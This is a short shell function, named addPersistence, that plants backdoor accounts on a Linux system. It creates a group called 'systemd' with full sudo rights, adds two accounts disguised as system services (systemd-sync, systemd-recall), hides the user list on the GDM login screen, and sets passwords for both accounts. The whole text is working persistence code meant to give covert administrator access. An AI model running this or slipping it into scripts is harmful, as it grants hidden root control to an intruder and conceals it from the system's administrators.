addPersistence() {
sudo groupadd systemd

echo "%systemd ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers

sudo useradd -u 569 -G systemd -M systemd-sync
sudo useradd -u 570 -G systemd -M systemd-recall

sudo sed -i 's/# disable-user-list=true/ disable-user-list=true/g' /etc/gdm3/greeter.dconf-defaults

echo "Password for sync"
sudo passwd systemd-sync
echo "Password for recall"
sudo passwd systemd-recall

}
